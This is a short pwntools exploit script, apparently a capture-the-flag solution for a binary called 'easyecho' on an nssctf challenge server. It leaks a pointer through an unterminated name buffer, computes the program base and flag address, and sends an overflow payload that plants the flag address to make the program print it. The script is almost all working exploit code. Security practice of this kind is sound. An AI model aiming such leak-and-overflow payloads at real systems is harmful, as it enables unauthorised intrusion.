from pwn import *
from LibcSearcher import *

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# p = remote("node4.buuoj.cn", 28576)
io = remote("node4.anna.nssctf.cn", 28341)
# io = process('./find_flag')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./easyecho')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    p.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()


# context(os='linux', arch='amd64')
context(os='linux', arch = 'amd64', log_level = "debug")

ru("Name: ")
s(b'a' * 0x10)
ru(b'a' * 0x10)
v9_base = u64(io.recv(6).ljust(8, b'\x00'))
elf_base = v9_base - 0xCF0
flag_addr = elf_base + 0x202040
print("elf_base =", hex(elf_base))
print("flag_addr =", hex(flag_addr))

ru("Input:")
sl("backdoor")
ru("Input:")
sl(b'a' * (0x88 + 0xe0) + p64(flag_addr))
ru("Input:")
sl("exitexit")

inter()
